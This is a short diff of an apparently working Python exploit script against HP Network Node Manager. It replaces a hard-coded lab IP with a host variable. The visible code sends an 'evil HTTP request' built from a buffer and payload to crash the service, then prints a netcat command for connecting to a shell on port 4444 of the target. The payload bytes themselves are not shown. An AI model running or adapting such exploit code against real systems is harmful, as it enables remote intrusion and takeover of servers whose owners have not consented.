@@ -5,7 +5,7 @@ import os
 import sys
 from struct import pack
 
-host = "192.168.103.175"
+host = ""
 port = 7510
 
 ### Use struct.pack to handle sending bytes in right order ###
@@ -125,7 +125,7 @@ buffer += payload
 print "[*] Sending evil HTTP request to HP NNM\r\n"
 print "[*] Crash takes a few seconds to occur\r\n"
 print "[*] After 45 seconds, attempt to connect with:\r\n"
-print "[*] nc -nv 192.168.103.175 4444\r\n"
+print "[*] nc -nv " + host + " 4444\r\n"
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((host,port))
 s.send(buffer)
